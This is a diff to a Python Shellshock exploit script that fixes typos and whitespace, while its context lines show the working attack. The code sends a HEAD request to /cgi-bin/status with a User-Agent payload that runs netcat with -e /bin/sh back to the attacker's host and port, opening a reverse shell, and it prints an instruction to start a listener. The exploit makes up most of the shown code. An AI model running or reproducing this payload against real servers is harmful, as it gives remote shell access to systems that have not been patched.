@@ -5,7 +5,7 @@ import socket
 # Consists of the HEAD request which is sent in addition to the custom headers
 def shellshock_http_req(lhost, lport, rhost, rport, target_url):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-   # Connet to this socket 
+   # Connet to this socket
    sock_connect = s.connect((rhost, rport))
 
    ''' HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" '''
@@ -16,7 +16,7 @@ def shellshock_http_req(lhost, lport, rhost, rport, target_url):
    #s.sendall(b"GET / HTTP1.1\r\nHost: 192.168.0.100\r\n\r\n")
    #s.sendall(b"GET / HTTP 1.1\r\nHost: %s\r\n\r\n" % rhost)
    #s.sendall(b"GET / HTTP 1.1\r\nHost: %s\r\n\r\n" % rhost_encoded)
-   # This request requires appropriate encoding of each parameter which gets added and these parameters need to be placed into a tuple of their own in which you can then place more than one formatting argumento
+   # This request requires appropriate encoding of each parameter which gets added and these parameters need to be placed into a tuple of their own in which you can then place more than one formatting argument
    payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded))
    
    ''' Don't even need the recv data because the data isn't even coming back to the program... We just fire the payload off that's it '''
@@ -56,7 +56,6 @@ def main():
     print("Sending payload\nEnsure to have a listener open on {}".format(lport))
     # This is what we pass into the HEAD request which actually performs shellshock
     payload = shellshock_http_req(lhost,lport,rhost, rport, target_url)
-
     #Just a GET request ATM. Needs to have a socket attached
     #result = shellshock_rev_payloads(lhost, lport, target_url)
     #for rev_payload in result:
